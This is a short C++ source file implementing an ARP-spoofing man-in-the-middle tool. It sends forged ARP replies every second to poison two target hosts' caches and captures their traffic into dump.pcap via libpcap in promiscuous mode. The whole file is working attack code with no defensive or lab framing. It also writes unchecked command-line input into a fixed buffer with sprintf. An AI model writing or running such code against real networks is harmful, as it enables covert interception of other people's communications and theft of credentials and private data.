#include "pgen.h"
#include <stdio.h>
#include <pcap.h>
#include <thread>

const char* dev = "wlan0";
const char* dumpfile = "dump.pcap";


void capture(const char* ip1, const char* ip2){
	pcap_t* p;
	pcap_dumper_t *pdump;
	char errbuf[PCAP_ERRBUF_SIZE];
	struct bpf_program bpfprog;
	char filtercmd[256];

	sprintf(filtercmd, "ip && ((net %s) || (net %s))", ip1, ip2);

	p = pcap_open_live(dev, 66536, 1,10,errbuf);
	if(p == NULL){
		fprintf(stderr, "%s\n", errbuf);
		return;
	}
	if(pcap_compile(p, &bpfprog, filtercmd, 0, 0) < 0){
		fprintf(stderr, "compile: %s\n", pcap_geterr(p));
		pcap_close(p);
		return;
	}
	if(pcap_setfilter(p, &bpfprog) < 0){
		fprintf(stderr, "setfilter: %s\n", pcap_geterr(p));
		pcap_close(p);
		return;
	}
	pdump = pcap_dump_open(p, dumpfile);
	if(pdump == NULL){	
		fprintf(stderr, "%s\n", pcap_geterr(p));
		pcap_close(p);
		return;
	}
	if(pcap_loop(p, 0, pcap_dump, (u_char*)pdump) < 0){
		fprintf(stderr, "%s\n", pcap_geterr(p));
		pcap_dump_close(pdump);
		pcap_close(p);
		return;
	}

	pcap_dump_close(pdump);
	pcap_close(p);
	return;
}


void mitm_attack(const char* ip1, const char* mac1, 
		const char* ip2, const char* mac2);


int main(int argc,char** argv){
	if(argc != 5){
		printf("args\n");
		return -1;
	}

	std::thread mitm(mitm_attack, argv[1], argv[2], argv[3], argv[4]);
	capture(argv[1], argv[3]);
}


void mitm_attack(const char* ip1, const char* mac1, 
		const char* ip2, const char* mac2){
	pgen_arp pack_to_target1;
	pgen_arp pack_to_target2;

	pack_to_target1.ETH.src = pgen_getMAC(dev);
	pack_to_target1.ETH.dst = mac1;
	pack_to_target1.ARP.srcEth = pgen_getMAC(dev);
	pack_to_target1.ARP.srcIp  = ip2;
	pack_to_target1.ARP.dstEth = mac1;
	pack_to_target1.ARP.dstIp  = ip1;
	pack_to_target1.ARP.option = PGEN_ARPOP_REPLY;

	pack_to_target2.ETH.src = pgen_getMAC(dev);
	pack_to_target2.ETH.dst = mac2;
	pack_to_target2.ARP.srcEth = pgen_getMAC(dev);
	pack_to_target2.ARP.srcIp  = ip1;
	pack_to_target2.ARP.dstEth = mac2;
	pack_to_target2.ARP.dstIp  = ip2;
	pack_to_target2.ARP.option = PGEN_ARPOP_REPLY;

	for(int i=0; ; i++){
		printf("0x%04x: %s[%s] <MITM> %s[%s] \n", i, 
				pack_to_target1.ARP.dstIp.c_str(),
				pack_to_target1.ARP.dstEth.c_str(),
				pack_to_target2.ARP.dstIp.c_str(),
				pack_to_target2.ARP.dstEth.c_str() );

		pack_to_target1.SEND(dev);
		pack_to_target2.SEND(dev);
		sleep(1);
	}		
}
